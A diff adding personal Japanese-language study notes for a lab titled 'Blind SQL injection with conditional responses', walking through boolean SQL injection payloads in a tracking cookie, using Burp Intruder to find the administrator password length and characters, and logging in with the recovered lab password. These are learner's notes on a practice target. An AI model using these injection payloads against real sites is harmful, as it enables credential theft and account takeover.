@@ -45,3 +45,91 @@ xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator')
 
 注記
 このSUBSTRING関数はSUBSTR一部のデータベースで呼び出されます。詳細については、SQLインジェクションに関するチートシートをご覧ください。
+
+
+
+
+
+
+
+
+
+
+
+LAB11 : Blind SQL injection with conditional responses
+
+Vulnerable parameter  - tracking cookie
+
+End Goals:
+1) administratorのパスワードを列挙
+2) administratorとしてログイン
+
+cookie editorを使って
+
+分析:
+検索で分類をクリックするとwelcome backという文字が表示される事を利用して
+
+1) バックエンドに飛ぶクエリを推測する
+SELECT tracking-id FROM traing-table WHERE tracking-id = '4iGVOSM2pFD5yIy4';
+
+-> 入力したtracking-idが存在すればクエリが返り、Welcome　backという文字列が表示される
+-> 入力したtracking-idが存在しない -> welcome backが表示されない 
+
+2) クエリに自分の文字を追加する
+SELECT tracking-id FROM traing-table WHERE tracking-id = ' 4iGVOSM2pFD5yIy4'AND 1 = 1--';
+(--で残りのクエリをコメントアウト)
+->TRUE なので追加した文がクエリとして実行されているためSQL脆弱性である
+
+SELECT tracking-id FROM traing-table WHERE tracking-id = ' 4iGVOSM2pFD5yIy4'AND 1 = 0--';
+FALSE　なので正常にクエリが使えている
+
+3) userテーブルが存在するか確認する
+SELECT tracking-id FROM traing-table 
+    WHERE tracking-id = '4iGVOSM2pFD5yIy4'AND (SELECT 'x' FROM users LIMIT 1) = 'x'--';
+サブクエリはusersテーブルに1レコードでもあれはXという文字列を返す
+つまりusersテーブルにレコードが存在すればX＝Xとなりtrueとなる
+-> usersテーブルが存在するか確かめている
+
+4) administratorがusersテーブルに存在するか
+SELECT tracking-id FROM traing-table 
+    WHERE tracking-id = '4iGVOSM2pFD5yIy4'AND (SELECT username FROM users WHERE username='administrator')
+    = 'administrator'--'
+->welcome backが出たので　administratorユーザーは存在している
+
+5)administratorユーザー（管理者ユーザー）のパスワードの長さを調べる
+SELECT tracking-id FROM traing-table 
+    WHERE tracking-id = '4iGVOSM2pFD5yIy4'AND (SELECT username FROM users WHERE username='administrator' and LENGTH(password)>1)='administrator'--'
+
+instruderにリクエストを送り、1をペイロード化して1-50をpayloadのnumberで攻撃　19まで同じだったlengthが20で急に変わった->>19までtrue ->パスワード文字数は20であると判明
+
+    ★administratorのパスワード文字数は 20文字
+
+6)administratorユーザー（管理者ユーザー）のパスワードを列挙して調査する
+一文字目a? -> falseならb?と一つ一つ20文字分続ける
+
+パスワードの1文字目がaかどうか知らべる
+SELECT tracking-id FROM traing-table 
+    WHERE tracking-id = '4iGVOSM2pFD5yIy4'AND (SELECT substring(password, 1, 1) FROM users WHERE username='administrator')='a'--'
+
+InstuderのPayloadでBlute forcer でa-z0-9を調査
+->一文字目はmだと判明
+1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20
+m p r g 1 g i x m h  m  t  s  m  s  x  7  c  l  s
+mprg1gixmhmtsmsx7cls
+
+7)administratorとしてログイン！
+ユーザー名　administrator
+パスワード　mprg1gixmhmtsmsx7cls
+ログイン成功！
+
+
+
+tracking-id = XrDnioOBDXJi285K' AND '1'='1と入力すると
+SELECT tracking-id FROM traing-table WHERE tracking-id = 'XrDnioOBDXJi285K' AND '1'='1';となる
+-> true -> welcome back
+'1' = '2'にして
+-> welcome backが出ないなら自分の文字を注入できている
+
+
+Ctrl + U -> URLエンコード
+
